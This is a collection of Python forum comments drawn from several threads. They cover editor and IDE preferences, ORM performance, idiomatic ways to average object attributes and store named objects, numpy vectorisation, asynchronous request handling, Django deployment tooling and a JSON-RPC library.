&gt; "How do you quickly evaluate a block of code in a text editor?"--the process flow in something like Spyder is simply, "highlight, hit f9. done", but with a text editor it's much more difficult for me. This seems like not much to do with being a 'text editor' or not - it's question of whether you can do it at all, and if yes then you can bind the functionality to whatever key combination you like. Whatever defaults there are will vary between editors. If you mean a text editor in the sense of something more basic that doesn't have this functionality, then probably there are two answers. The first is that others simply aren't so specific and are talking about editors like emacs or vim that can easily do this and far more. The second is that not everyone finds that functionality that useful, maybe other people combine their editor and python shells in other ways. For instance, I've never got in the habit of running code this way though my editor could do it if I wanted. &gt; I still feel inadequate for some reason There's no need to feel inadequate, pycharm and spyder are good, and I certainly wouldn't say that any text editor camp suggesting text editors are simply better is actually correct. But many text editors are popular because...well, they're really good.
Some may recommend/prefer: from itertools import izip A = get_list_A() B = get_list_B() C = [] def cmp(a, b): if a &gt; b: C.append(a) map(cmp, izip(A,B))
SQLAlchemy is fine. Hundreds of requests per second isn't very many, and your ORM isn't going to be your bottleneck, your web tier should be stateless so it's trivially to scale out.
Okay. If not ORM then what is typically the bottleneck (assuming no bandwidth/network issues)? Is it going to be my database (mysql/sqlite/etc.)
Here's how to do it with a basic loop: clist = [] for a, b in zip(alist, blist): if a &gt; b: clist.append(a) Here is how to do it with a list comprehension: clist = [a for a, b in zip(alist, blist) if a &gt; b] 
One of the thing that PyCharm will maintain in RAM is a index of every python modules you have installed and all the files in your project so that it can provide auto-complete. It will also basically be continuously parsing the code you write (practically compiling it) so that it can statically analyze it and provide all those useful suggestions like the fact that a variable is never used.
2 problems with that. 1. `map` with side effects makes functional programmers cry. 2. `map` is lazy in Python 3, so it won't actually do anything unless you say `list(map(blah))`.
Depends entirely on your app, but the ORM is essentially a thin wrapper around calls to the database engine. Actually running the queries is likely to take many many more times as long as the tiny bit of overhead an ORM adds to the process.
"Not every trivial function needs to be a built-in." "Not everything needs to be a one-liner." "Design Patterns? We don't need no steenkin' design patterns!" "Never use a metaclass when a custom descriptor will do. Never use a custom descriptor when a property will do. Never use a property when a regular attribute will do." "You probably don't need a class for that. Unless you do." "Python isn't Java. And Java isn't Python either." "Metaclasses ate my brain." 
There is a lot of religion to this question. Pretty much everyone will give you a different point of view and there is no definitive answer. I also apologize for the length of this post. Anything after this point is an op-ed. Caveats out of the way, having passion for a particular editor or IDE usually means that you try to convert people into your way of thinking. I think this is natural but it feels a bit like those door to door religious advocates we all love. For that reason I try not to do it and you should try not to as well. Additionally, it's bad science. You should evaluate and test everything and use what makes you most productive not what makes someone else that's really passionate about their thing the most productive. Remember, no manager cares what you wrote the code in, the value is in the output. My personal opinion on the matter is that the two have obvious pros and cons. I still use both styles of tool. One of the differences I see brought out a lot is that a text editor like Sublime or vim will always be way faster than a fully baked IDE. Faster is more nuanced than say, how fast the application starts up. For me it's always weighed against how many hours it takes to complete a project. Debug, refactor, automatic import, static analysis and code sense save me WAY more hours programming than the occasional stutter or slow start. Fast computers are cheap these days anyway and I can barely tell the difference on my current hardware. Another difference for me is that it's easier to get started with a text editor. I still use Sublime for one off scripts or for simple edits. Not all of my work revolves around a "project" so I still find those tools useful. Most co-workers who express interest in being brought into PyCharm (or another IDEA product) from a text editor usually have this immediate reaction of what I can only describe as fear. They'll note it's slower and more complicated and why the hell would you use such a thing when the beautiful simplicity of a text editor is all you need to get the job done. After the FUD dies down a bit they learn how to use the keyboard shortcuts they had in the text editor. Then they see some of the refactor features, code sense, inspection and by the time they have things like linting they are usually on board. Then I show them how to debug live processes and their eyeballs nearly fall out of their head. TL;DR Be pragmatic about it and use what makes you the most productive. Using a text editor over an IDE does not make you a better programmer but it might put you on a higher horse.
&gt; As for using the other slashes, the output of this script ultimately goes into another tool that only accepts the \ style slashes. You only need to worry about escaping backslashes when writing paths as string literals in your code. If you're reading them from a text file, backslashes are just regular characters like any other. They only have special meaning to the Python interpreter in string literals, so you can avoid that hassle by writing the paths using forward slashes, then normalizing them with `os.path.normpath`. 
Dude, ever seem the stacktrace of a sqlalchemy error? Hundreds of levels of indirection, the thing is a huge stack of abstractions. Now, don't get me wrong, yes, SQLAlchemy is pretty cool, well designed and implemented, and will likely not be a problem. But it ain't no "thin wrapper", that's what I'm trying to say. But apart from that, yeah, OP's more likely to have a bottleneck in other parts of the application/stack.
Most applications will hit a bottleneck in the DB first, mostly because it's very easy to add more web nodes; adding more database nodes is more complex.
Assuming that you are running the exact same Python code on both machines, it looks like a bug in tk/tcl on one of the machines. (Tkinter calls tk/tcl to do the actual graphical widgets.) You can confirm that Python is not the source of the problem by adding this line after the definition of path: path = "src\my_module::my_struct.my_var" assert path[3] == '\\', 'expected backslash but found %s' % path[3] You can also check whether the Tkinter widget is seeing the same string: self.hlist.insert('', 'end', values=(name, size, address, path + str(len(path)))) This will append the length of the path to the path itself, so if you see: src\my_module::my_struct.my_var31 on one machine but srcmy_module::my_struct.my_var31 then you know that it is a display issue, that the second machine's tk/tcl is failing to display the backslash. But if you see: srcmy_module::my_struct.my_var30 then you know something is removing the backslash before it gets to the "self.hlist.insert" line. 
I interpreted it as saying that his/her workflow wasn't scalable to a team, so the team had to put a new one together.
I'll give this a shot on Monday at work and see what the results are.
Noted, thanks.
your performance problems will be related to the actual query complexity and the size of your database tables. the overhead from the ORM compiling some ORM data structures into SQL statements is negligible. 
I approve 100% of what you are doing. As a dev, my biggest headaches are caused from business and sales people who don't have a clear idea about what they want from me. Anything you can do to add clarity is wonderful. Doing it with Python is just twice as good, since it means that you can SHOW ME what you're trying to do and we can work on it together when the time is right.
Something like: import gc np.mean([e for e in gc.get_objects() if isinstanceof(e, Employee)] ... http://stackoverflow.com/questions/328851/printing-all-instances-of-a-class This would not be considered a *sane* solution though. The normal way to do this would be to keep a list as you create them, and then use it for computations over the whole set. Inside the Employee class isn't really the appropriate place for this. 
You would need more than just the salary, you'd also need to have the number of employees to find the average. Why not have a list of Employee, sum the salaries, and divide by len? tot_sal = 0.0 for e in initech.employees: tot_sal += e.salary avg_sal = tot_sal / len(initech.employees)
I thought this wasn't a very pythonic solution: np.mean([employee.salary for employee in employees]) Plus it had to be done outside the class, which is bad?
What you need is a for loop. Not gonna show you how to do it since you're not supposed to do.... oh nvm.
Why is that bad? It would be bad if an employee instance had knowledge of how many other employees there were. Avoiding OOP where it would be overkill is very pythonic.
&gt; Plus it had to be done outside the class, which is bad? Outside the class != bad. For example you wouldn't expect a Car class to tell you the average mileage of all existing cars. That would be something for some type of CarDealership class.
I get what you're saying, but call stack depth really doesn't mean much in this context. If I made an ORM that did everything in one giant function, I assure you it would be worse in every way.
thanks. I just briefly looked at its website, looks light indeed. I guess I should have mentioned that I "prefer" to use WAMP, or a similar protocol, just for the sake of simplicity of my programs. Thanks again.
Or you could write custom SQL to do the average. Very fast; not necessarily great from a maintenance point of view. 
Not very related, but if this were a table in a database and Employee was a model in an ORM like sqlalchemy or django, what you are asking would work more like what you are thinking (data aggregation defined within the class/model). Otherwise I agree with everyone else, keep track in a list.
If you really wanted to keep it 100% OOP, you could create a separate class that serves as a collection of Employees, perhaps one called Organization or something. Then the average could be a method of that class. But as you have it set up right now, the best way to do it would be outside of the class with a separate function.
Uh... You know nothing about how data is stored. You know nothing about how data is accessed. Custom SQL is not faster than Python unless you're querying for all employees and then finding the mean (on some hypothetical client). But if the employee data is not in a database, you're wrong. You're making a very large assumption. Also, there's nothing wrong with that sort of SQL from a maintenance sort of view. At all. Period. That's the simplest of all SQL queries. What could be less maintenance than that?
ugh pls dont this. just collect employees in a list like a normal person.
This is absolutely pythonic. You don't even need numpy unless you are already pulling it in for some other stuff.
Numpy doesn't just make things faster. It can be slow as hell if you just use arrays instead of lists. Use numpy if you can do most of your math on large arrays with reshaping arrays and broadcasting and the built in ufuncs, or need a C array for cython or something. If you are just using for loops, and not really using numpy, it will be a huge pain and perform worse. Edit: You didn't profile the function that's taking all the time, and your profiling method isn't showing the hidden function calls (such as array creation) like run from cProfile would. Incidentally, are you instantiating new Map objects just to call one function? 
C = [ val for idx, val in enumerate(A) if val &gt; B[idx] ]
Would not expect anything less from Tim Peters.
So, here are more details, ask more if you need. When I receive the file (let's say, the http POST with the file), I need only to reply with the HTTP 200. No business synchronous ack. What I need to do with the file is open it (it's an XML file), extract one ore more ID (it could embed more requests) and make an HTTP post with a business answer with that ID. The business answare will always be OK, because it is a transmission ack which means that I received the file correctly. Then, in a second moment and with more time at disposition (1 day), I need to process the request, do many check and then reply with a business validation, but this second step is not the point, I have more time to reply. The problem with the I/O is that when I receive the request, even if I can elaborate in it memory, I need to write both the answer to a queue (to be sent asap) and the request (to be processed later). Thanks everybody for your effort in replying, I appreciate it a lot (and sorry if I'm not replying very quickly, I'm living in GMT+1). Gianluca
What's New in the latest version (0.2.4.post4): The `settings` parameter is a superset of the deprecated `settings_path` parameter – it lets you specify default values for multiple settings with either a dict or a pathname to a "settings file" (a text file containing lines of the form `setting_name = value`).
Yeah, obviously the best approach is to set a metaclass and override `__new__` to keep track of objects that have been created (what's a memory leak?)
&gt; extract only one field and send an asynchronous response via a post call. This bit confuses me. A common pattern is to accept some data via POST and return a task ID which is later queried with a GET (that's the asynchronous bit). The POST causes some work to hit a task queue (celery backed by redis is common) and the GET queries the progress of the task. Others have suggested some options. I suggest looking at gevent as an alternative to tornado. Nginx also has a file upload module which is great if you expect lots of concurrent connections or large files. Instead of file data being passed in memory to your web server it writes it to disk and passes the file location to the application. Given that it sounds like your files may end up on a filesystem anyway to be processed by a background step this might be worth a look.
indeed
Definitely not a waste of time. You are learning a skill that few in your role will take the time to even tinker with. Just realize that it is a marketable skill (though don't over sell yourself too much on that resume of yours).
As someone who has programmed professionally for about 10 years I can say that this would be really refreshing. It is almost always easier to work with people who has some degree of technical knowledge. They have a better understanding of what's possible and what's not, and they know how to be specific about what they want. There's nothing more disheartening than dedicating a large piece of time into designing and building something based off of vague requirements just to find out that your client is irritated that you misunderstood them. I can't imagine why your colleagues would have a problem with this. That idea that "not part of the job description" strictly defines your boundaries at work is toxic. I think that if you take your career seriously you should be willing to go the extra mile to make sure things are done well, and this sounds like a manifestation of that work ethic. 10/10 would approve of again.
Well the funny thing is that they are the same people who complains that developers "don't understand the functionalities of our products, and just code blindly". I often wonder if they really don't know or if no one ever bothered to explain them how each request fit in the global picture...
Don't worry. I have been working there for 4 years, and people are just starting to realize that I know C++ and Java. And a little bit of Python now. Somewhat it makes it easier to detect bs when going to technical meetings 
Thanks for all your answers. I just got out of a week of intense coding and wondering it it was worth it. Now I am feeling better. 
This is for my A level Comp Sci project, I am doing a parents evening appointment system for context. 
Push to an array. Or if they need a name associated with them , you can add them to a dictionary.
&gt;reddit actually locks you from posting consecutive posts before a gap of 15 minutes. Is this an example of reddit's implementation not able to scale? That limit has (as far as I know) nothing to do with db, it's there to make spamming harder and it only applies to new accounts, those without a lot of subreddit specific or general karma, and to accounts without verified email. Here's a graph that shows amount of reddit postgres cursor execs per second before, during, and after maintainence: https://i.imgur.com/ft9gQgN.png 
Don't create new variable names for each teacher; you're duplicating information. (Specifically, the teacher's name will exist independently as a variable name and as the value of the Teacher object's "name" field, which invites trouble.) Instead, consider making a list of teachers, which you can search by name, or create a mapping (i.e. a dictionary) from teacher names to Teacher objects. If, at the start of your loop which reads in teachers from the database, you create a new Teacher object "foo" this might look like: teachers[foo.name] = foo; Then later on you can do, for example, teachers["Dongle"], provided that the string matches exactly. If you want fuzzy search, that's a lot more sophisticated. *edit:* if you're not familiar with dictionaries, check out the [docs](https://docs.python.org/3/library/stdtypes.html#mapping-types-dict). You can do things like `teachers.keys()` to return a list of all of the valid values, or `teachers.items()` for a list of just the teacher objects. You can also iterate over a dictionary's keys like `for name in teachers: pass`.
I once asked this exact question...the answer is to use a dictionary. You don't need to generate a new variable, you just generate a new key. 
&gt; If I made an ORM that did everything in one giant function I mentioned the size of the usual stacktrace as an indication of the level of abstraction. When dealing with the SQLAlchemy ORM, you are dealing with models, types and relationships, abstractions that are pretty far away from the database itself. For me, at least, a "thin wrapper" would be something like the DB API implementations (pymysql, for instance), that doesn't add that much structure over the connection with the database. 
I'd be more worried about Python and Flask's inability to easily handle concurrency than about SQLAlchemy's speed. If you can use 4 or 8 cores simultaneously rather than just 1 then your database accesses get to be 4 or 8 times slower before you have a problem.
I think this is possible with some dynamic python magic but it is very very highly discouraged. Your co-worker will slap you in the face kind of discouraged. Please use a list or dictionary instead.
Or, if there are a lot of employees: avg_salary = sum(e.salary for e in employees) / len(employees)
&gt; what's a memory leak? https://docs.python.org/3/library/weakref.html
Doesn't work if you can get lists of different sizes, zip would truncate the longer list and you'd miss some values. Not sure if that's a valid test case though.
You know how some people say that there's no such thing as a bad question? They're actually wrong. This is a bad question. There is a way to do what you're asking. But if we told you the answer to the question you're asking, we'd make you a worse programmer. You've got a problem, "I want to store information about a bunch of teachers." You've got an idea, "Maybe I can make a new variable for every teacher based on his name." And you found a *new* problem, that you don't know how to do that. So instead of asking about your original problem, you asked about the problem that only exists because of your idea for the original problem. In programming circles this is known as the XY problem. You've got problem X, you *think* the solution is Y, so you ask about Y. Lots of people have already said the right answer. Use a dict.
Also, how would I implement a 'board'?
Thank you all for your help, instead of using a dict, I realised that I didn't need to name each variable if I just made MrDongle another part of an array then index the array. You didn't have to help me but you did! You guys are awesome!
Thank you 
First off, Good Luck! You can do it! 2nd, you are asking a couple different questions here. A server can mean 2 things. A web server is: 1) The physical (or virtual) machine that serves files upon requests. 2) The software that handled these requests and returns a response. (typically something like nginx or apache) I have not taken a peak at your tutorial, but here is my take at your questions: 1 &amp; 2) Yes both django &amp; virtualenv are installed on the server (meaning the machine). Django being the framework for you to write your web application in and virtualenv being a convenient way for you to quarantine different python interpreters. 3) Vagrant is a tool/framework that helps you managing a VM for development that is supposed to be as close to your production environment as possible. It doesn't do the setup of your machine itself and it doesn't have anything to do with deployment of neither your machines or your applications. Edited with /u/dAnjou's fixes!
Thanks! I did look into Flask. It just seems Django has the most help available in form of forums and community. 
I guess my server is both? maybe? See, I'm trying to run it (whatever it will be) on my own home server. So I installed LAMP. So my home server will be serving the files while Apache handles the requests. Hopefully, that makes sense. Thanks for comments! 
I wrote a whole lot about performance here: http://docs.sqlalchemy.org/en/rel_0_9/faq.html#performance - there's more to come, and it's a good way to get a view of the performance landscape. As scale goes up, it can definitely be hilly. But passable.
Yes it's all open source. The majority of the code lives in the factory class, and the class generation happens on this line: https://github.com/boto/boto3/blob/develop/boto3/resources/factory.py#L93 We construct a dict of attributes and bound methods based on the JSON model and then create a new class from that. At the time of this writing there is no caching in place, but that is coming soon to prevent reprocessing the JSON each time.
This is still a favorite article on how to get django running on webfaction with apache, mod_wsgi, and virtualenv: http://michal.karzynski.pl/blog/2013/09/14/django-in-virtualenv-on-webfactions-apache-with-mod-wsgi/ I typically use the built-in django test server locally in a virtualenv (https://docs.djangoproject.com/en/dev/ref/django-admin/#runserver-port-or-address-port; no vm needed) to develop projects and then push them out to a server setup described in the above article.
For the purposes of benchmarking for speed the entirety of the ORM code is likely irrelevant for most web apps.
How big/business critical is this app? Is this a one shot thing, temporary, or is it to be more production stable and long term? Here's how I would set it up: I'd use a Tornado web front end and a celery+rabbitmq backend. The web front end would take care of initial doc validation, trigger the celery task and respond with either a 200/201 or 4xx/5xx as necessary. In fact, you could.. and should - have tornado handle to file upload (if it's a file POST and not xml-in-the-body) to save you from storing it to disk- you'd just pass the xml object along to the celery task as a parameter. That saves additional io-bound load and will help speed things along. The celery task would handle the actual document processing and the post to the third party. In fact, you could easily split this up into several chained tasks to keep the programming nice, clean and easy. (Tip, Put the tornado instance in front of nginx or openresty and run multiple discreet instances as needed) This gives you the advantage of being able to monitor the task queue, detect failures, automatically handle retries and so on. It also gives you the ability to run multiple instances- on multiple servers for scalability. That's how I would do it. Sort of a best-of-all-asynchronous-worlds for me. I do have another solution- but it's considerably more effort and more difficult to scale- it involves using something like couchdb to save the xml document, triggering the changes feed and a second web-app that long polls the feed and acts upon new documents. I've done THIS before too, but that's before I discovered celery and rabbitmq. 
don't get me wrong, the numpy operations are lightning fast in itself, like 10x faster than list comprehension, but the effect after doing that is weird. I now included triangle function profiling, all in all it's simple crossproduct. I don't know about hidden function calls tho. I got like 2 functions in Map that i call every now and then. (pre calculate cross products and filter which walls / lines hit my field of view)
Yes, yes, no.
Flask is a WSGI application. use gevent.wsgi, mod_wsgi or any of the other zillion multiprocessing servers. explicit ~~spaghetti~~ async servers like Tornado have no superiority here as they have to do the same exact thing (use multiprocessing). Also, a claim ilke "N cores == database access time is N times faster" is not true at all. Cores != speed, they allow greater concurrency when there is contention for CPU resources. As database access is usually an IO-bound situation, cores are only a small portion of the "speed" equation and only in specific scenarios.
Fuzzy searching isn't too difficult, there's difflib (in stdlib) &gt;&gt;&gt; difflib.get_close_matches("tech", ["teach", "teacher", "topnotch", "teachy tv"]) ['teach', 'teacher', 'teachy tv']
&gt; 3) Vagrant is a tool that allows you automate the deployment of your ubuntu machines, including setting them up on your development environment and in production. This is by no means 100% required, but it is a great tool. Not correct. Vagrant is a tool/framework that helps you managing a VM for development that is supposed to be as close to your production environment as possible. It doesn't do the setup of your machine itself and it doesn't have anything to do with deployment of neither your machines or your applications.
If you're just tinkering with one thing, and not really sharing it with others, you don't need vagrant yet. You would call your home machine a "web server" since that is it's "job". Django can do a "bang-up" job of responding to port 80 HTTP requests by itself (the technical jargon for what your web browser initiates when you hit enter on the url bar), mostly for debugging purposes; or you can set up a "fast" / "production" web server, like nginx / apache, to listen on port 80 instead, and then there are a couple of ways to have them pass the request onto a python interpreter running your django application, which then sends the response back to nginx/apache, which then forwards that back to the client's web browser. Google "setting up django with nginx" or "setting up django with apache", and look for recent articles (&lt;2 years old) or I imagine there will also be content in django's own documentation about configuring and connecting it to work with one of those.
For loops in numpy are slower than lists in python. You have to vectorize your code. For example... Code like this is slow: nodes = ... # double ndarray of (nnodes, 3) tris = ... # int ndarray of (ntris, 3) area = zeros(ntris) for t, tri in enumerate(tris): n1 = nodes[tri[0], :] n2 = nodes[tri[1], :] n3 = nodes[tri[2], :] area[t] = norm(cross(n2-n1, n3-n1)) This is fast: n1 = nodes[tris[:, 0], :] n2 = nodes[tris[:, 1], :] n3 = nodes[tris[:, 2], :] area = norm(cross(n2-n1, n3-n1), axis=1) It's so, so, so important to vectorize your code. List comprehension is much, much slower than properly written numpy code. EDIT: it's a pain to write bug free vectorized code without actually testing it
You could try the djangogirls tutorial: http://tutorial.djangogirls.org Guides you from very basic stuff to running django on heroku. Works for men too :)
I can't really tell what you're doing so forgive me if I'm off. Are you doing the cross product on each pair of vectors one at a time? Numpy is designed to work on huge sets of data without python loops (well, thats one thing it does). You can do the cross product between all of your rays and all of your triangle edges is one go. No loop, and it would be super fast. Also, why don't you use numpy.cross? Looping through and accessing individual elements and allocating new small temporary arrays to hold intermediate values is going to be slow. By hidden functions, I mean cProfile will show how much time is spent on functions called implicitly by your code. For instance, how much time spent allocating new arrays, how much time numpy spends multiplying, how much time you spend instantiating new Map objects to call one function and throw away. (Map().myfunction() is unnecessary overhead and I'd say also abuse of a class method. Call mymap.function() where mymap is a previously instantiated and reused Map object instead.)
TIL. I love that I'm still learning about things like this in the stdlib. Thanks!
my approach has always been to not worry about how shitty a job of query generation an ORM does until you have a use case where it actually matters. this means profiling your queries and figuring two things: 1. which queries suck 2. where those queries are called from, because it might not even matter optimizing is a pain in the butt. I try to only do it when I can prove that it will matter. 
As I said Vagrant doesn't do that by itself but you can certainly use Ansible for deployment. It really depends on your setup though. This whole thing can be really confusing and there isn't really a wrong or right way. Some people use Ansible/Chef/Puppet for provisioning (installing packages and putting configuration in place) and *pull* deployment (pulling a stable version of the code and installing it). Others prefer *push* deployment using Fabric or just Shell scripts. And some even leverage the distro's package management (DEB, RPM, ...) to do all that.
Great resource, thanks!
I'll definitely be asking questions, thanks for the response.
Sweet, thanks!
If you're just learning Django, I'd forget about setting up a virtual server for a while. Just use the built-in Django "runserver", which spins up a development server for you. The only reason you'd need a virtual server in vbox or whatever is if you want to learn what it means to *deploy* an application. That's down the road anyway, and you should generally know how to develop an application (in my opinion) before you know how to put it on the web. That said, if you *are* looking to learn about deploying, it's icky, if you ask me. I like Nginx + gunicorn as it seems to be the most straightforward to me. But then you have to set up your virtual server correctly to allow web requests. 
We need some Python Haiku to go along with the aphorisms. See Windows Haiku, for example. 
Just googled Windows Haiku, came across this gem, had more haiku than I had seen some years ago on other sites: http://www-users.cs.york.ac.uk/susan/joke/haiku.htm 
Looks cool. Does it support ssl?
Saved, thanks for bringing this up. Looks useful. 
Fails if no employees. Should default to using numpy.
Fails with no employee. Should use the numpy implementation.
If this is your first webdev project, don't bother with virtualenv and most deployment tools like fabric and vagrant. For your second project you can use those tools, but they will only get in your way. Even seasoned veterans mostly only use virtualenv on their development machine. It doesn't make sense to use it on a server. The magic of virtualenv is that it allows you to switch between different environments, which is useful if you develop on multiple projects at once. Most servers are made to serve only one app, so virtualenv doesn't make as much sense in that context. Vagrant is only useful if your site has so many users that you've scaled to a point where you have multiple webservers, multiple db servers, load balancers, etc. If you're still in "stealth mode" (or your site doesn't have much users yet) you should be able to fit your entire app onto a single server instance.
How does it handle network failure? 
Hi, just wanted to say thanks for the blog! I decided to take up Python/Programming a couple months ago as well, and I have used your blog as a resource a couple times. Mostly to see how someone else reasoned through some of the more difficult problems. Other answer sources give an answer that involves functions and methods I am not familiar with yet, so I like having an answer resource that is following the same learning path as me. It has been useful!
Did you even try? lol
To be fair, OP hadn't specified what should happen if there are no employees. (Also I prefer `ZeroDevisionError` to `nan` but maybe that's just me.)
Originally I wrote this to solve a problem we have at my work. We're interested in making a server that will handle modifying files as a specific user to change config values like hostapd's SSID or WPA or something. I included an example that works to this end in the git repository.
[How is this better than the std lib xmlrpc?](https://docs.python.org/2/library/xmlrpclib.html)
wanted to add a little more to this answer. numpy is backed mainly by C, and even though C is way faster, sending data back and forth between C is not free. if you're making lots of small calls to pull data out of arrays, etc., you're spending more time talking to C, than running code in C. to be worth it, you need to run vector/matrix operations.
Python-JRPC makes a focus on exception handling, and because of that almost everything that goes wrong will throw a, hopefully useful, exception. JSON RPC v2.0 outlines several error types that I've made into python exceptions. Clients will also throw exceptions when a network error occurs.
I'm just beginning to learn Python, so I wouldn't be able to do this FOR you, just wanted to say that its lame to expect others to do your homework for you. It would be totally appropriate to ask about a specific problem you're having while you're attempting to figure this out for yourself. 
Surely numpy is too heavy duty for this kind of thing.
I will probably write a TLS/SSL version of the SocketObject/SocketProxy on Monday.
1. Method decorators are easier to read and use than registering functions. 2. xmlrpclib.Fault's make exception handling harder as just one exception type is thrown, I focus on making less work for the developer by throwing the exact exception in the client context that was thrown in the server context, or a useful one if another error occurs. 3. (XML vs. JSON)
metaclasses dont even approach the solution to the problem class Employee(object): instances = [] def __init__(self, *args, **kwargs): # do stuff self.__class__.instances.append(self) for i in xrange(10): Employee() print Employee.instances
I hate answering questions like this. I know your question was concerning idle and this does not answer that. My fave editor for python is jedit. the interpreter and system prompts at the bottom are very useful.
I feel like that's saying "I'm not a math person" for stuff like this. You've taken the course, you should be able to do this. Also, if this is for college/university, can't this get you kicked out or suspended or at least fail the course?
...[PyDev](http://pydev.org/) for Eclipse is dope too.
I've never needed to do more than: export PATH=/path/to/venv:$PATH
I didn't know JSON RPC was a thing. That's a little worrying. RPC has been a bit of a rollercoaster. It went through a period of huge popularity with Sun RPC, DCE and CORBA, then fell out of favor and was considered an antipattern, because making remote calls transparently look like local ones disregards most of the twelve fallacies of distributed computing. XML-RPC and SOAP were almost universally derided outside of the Microsoft world, especially because of their use of XML. Now it seems like it's seeing something of a resurgence with projects like Twitter's Finagle.
The code assumes the existence of a directory of .py files. This will break when packaged as a zip of pyo/pyc files. What's wrong with setuptools hooks?
I am aware of that. Did you check your environment variables? If both instance's paths are in there you may have a collision of interpreters causing it to crash. Other than that there could be various reasons why it is crashing. Are you running 32 or 64 bit windows? Did you install the corresponding Python instance?
Well, you could have a box, and it could have something on startup that triggers a deployment? Then you just vagrant up, and your code deploys eventually. Yes, I'm not serious. Vagrant is for throwaway VMs, most often used for testing. Your testing framework/Jenkins will trigger vagrant to roll through starting up various VMs for testing through whatever different platforms you need to test on, deploy your code onto it, run your tests, then destroy the VM so the next time you run, it will be in a clean state. However, I've been moving everything from Vagrant and into Docker, as it's quicker, and if you really want, you can roll up a container, deploy code, test code, and instead of just destroying it at the end, you can have the option to roll the container right from your test environment and into production if that suits your needs. I still love Vagrant for testing toys, so I don't have to muck up my workstation. Wanna test KDE 5? Grab a base box, Vagrant up, and install KDE 5 and play (btw, looks nice, super configurable as always, but unstable and crashy as hell. And if there's something in KDE 4 that bugged the crap out of you (panel won't span monitors), it likely still exists.)
The reason it sees the number as zero is because the integer values have no decimal place holders. but how do I get decimal values
Could you do away with the need for `jrpc.service.SocketObject` (probably via globals) for mini applications like this?
I just upgraded my 2.7.6 to 2.7.8 and it started up just fine. Check your path! By default the installer will not add the python to the path
Now you're lame. 
I was being short because I was typing on my phone. I shall elaborate! - While it's true that I know nothing about how data is stored or accessed, I'd bet you $1 that it's in an SQL database, or that if it's not, it should be. - His question was, "I want to return the average salary for all employees". So it sounds to me like he wants to know the mean for all employees. The implementation he suggests, while I like it and would probably do it myself, would likely involve a number of selects linear in the number of employees. Agreed, if employee data is not in a database, then all the custom SQL in the world will not compute the mean! - I would not say that "select avg(salary) from employees" (or whatever) is the simplest of all SQL queries. I'd vote for "select 1", or something like that, as being the simplest of all SQL queries. Sorry for being pedantic. You started it. :-)
If you've ever used XML-RPC, you know that you never *see* any XML. So if it was "universally derided outside the Microsoft world" (which I don't think it is or was) because it used XML, it's a bad case of judging a book by its cover.
Oh: Any custom SQL is (probably) worse from a maintenance point of view than no custom SQL. That's why ORMs were invented...so that people could change the underlying data storage without having to rework all their data access.
You can always shorten the names in your programs by doing something like: from jrpc.service import SocketObject Or are you suggesting something else?
And you've been a bitch since comment number one 
&gt; What's wrong with setuptools hooks? Nothing, but why use them if your use case doesn't require them? 
Have used XML-RPC. Have seen its XML. So.
Thanks for all the suggestions guys! Checking them out now :)
go to /r/learnpython for simple questions
And it mattered?
The OP is asking for help cheating on a college class and you're condoning that? Anywhere you ask in the IT field, asking for someone to help you cheat isn't going to fly, and if cheating isn't bad enough, its completely lame to not at least try to work through it yourself first and then ask for help on any errors or specific questions. Congratulations on outing yourself as a fucktard. 
Yet no where did he say he never even tried, and you're an idiot if you think that's Only in the IT field that cheating isn't condoned. Even still, who are you to pass judgement, as if you're some saint yourself. Don't act high and mighty over the Internet because you're the one who comes off as a self righteous fucktard. Thanks for playing the internet, but you lose. 
checked the path: c://python27. and i uninstalled both versions and reinstalled 2.7 and still nothing. i get that little command prompt to show up and it goes away instantly. i am running 64 bit windows and did install the correct one.
This is incorrect - the ORM can *easily* be your bottleneck.
Every... debugging... session.
Honestly, to answer your questions, I want to learn it all. I think they are all useful aspects to learn in deploying an app. Maybe, I'm just biting more off than I can chew. 
A convenient time to point out that Python-JRPC supports pretty verbose debug mode on the server objects. Never worry about looking at a single TCP socket.
You've an entirely different experience with XML-RPC than I've had. I've implemented XML-RPC parsers but that was the only time I really had to know or care that XML-RPC used XML. Maybe Python's XML-RPC client library has spoiled me.
Weird. Can you open a command prompt, and type: c:\python27\python.exe -m idlelib.idle Paste any messages you get in reply.
There's also a project called [superparamiko](https://github.com/rossdylan/SuperParamiko) that mixes Paramiko with pbs. Pretty fantastic IMO.
Sounds like you might be a candidate for [Real Python](https://realpython.com/). They have three courses... one is just intro to python, the next starts just a little ahead of what you described and then moves to Flask and Web2Py and a little bit of Django, and the third focuses more on Django, TDD, Bootstrap, a bit of Angular. Yes you can find pretty much everything they provide somewhere else on the web for free. How much time you'd spend sifting thru the dross to get to the good stuff, and how much that time is worth, is up to you. They have been pretty good about keeping their courses updated over time since the Kickstarter campaigns, which you don't always see. Another site (free) that might help you figure out what you want to do or work on would be [Full Stack Python](http://www.fullstackpython.com/). HTH.
In addition to the human costs of verbosity, it's also wasteful. For more trivial communication (which often dominate web service use cases), XML a can add an order of magnitude more transmission. With the popularity of JavaScript for web service clients and, more recently, servers, JSON has the added benefit of being particularly advantageous as a serialization protocol. XML was derided for its "bloat" in a time when brevity and fitness for purpose became the hot trend, rather than generality or universality.
Nah. Its great to get excited about learning new things. The problem though is that if you try to learn everything at once, you're working against yourself. Its very easy to get frustrated when things go wrong and it will be very difficult to troubleshoot and narrow down problems as they come up. The right thing to do here is to make a sort of plan for learning the right things at the right time. So heres the deal. You're currently on a Linux OS. Let's forget about Vagrant/Ansible/Servers etc. That's an entirely other set of skills that you can learn much later on in your journey of becoming a Django developer. I'd say you're a year or two out from really needing to understand this. The good news is that deploying a django app on top of something like Apache or Nginx is easy, once you understand django. Edit: I just realized, since you mentioned LAMP in another post, is that you might not be entirely sure how to run and test the app right? You might be thinking you need to setup some type of server to deploy and test the application. The cool thing is, you don't need to do all that to work with django and python! You don't even need to install a database other than sqlite, which should be installed by default on Ubuntu! Django makes it very easy to develop, and once you follow the tutorial I posted below it will all make sense why people are telling you to not setup a server. Hint: Django has a web server built into it for development purposes and that server autoreloads itself everytime to make a change to your code. It's very easy. So here is a recommended learning plan I have for you, for now to get yourself started. First, I'm going to go ahead and recommend that you learn virtualenv and pip. It's so crucial to doing anything in python and as you jump from framework to framework and project to project it will make your life so much easier. Why learn it? Because pip and virtualenv isolates project dependencies locally rather than globally. If you install django through virturalenv it will only exist inside of that virtualenv but NOT system wide. This is useful because you might find yourself working and exploring through several different frameworks and versions of frameworks over the next few years as you grow as a developer, and working with different system wide versions of the same library can be very, very painful. virtualenv takes this pain away. pip is a dependency manager for python similar to rubygems or aptitude (Ubuntu's package manager). Here is an excellent guide on [pip and virtualenv](http://www.dabapps.com/blog/introduction-to-pip-and-virtualenv-python/). 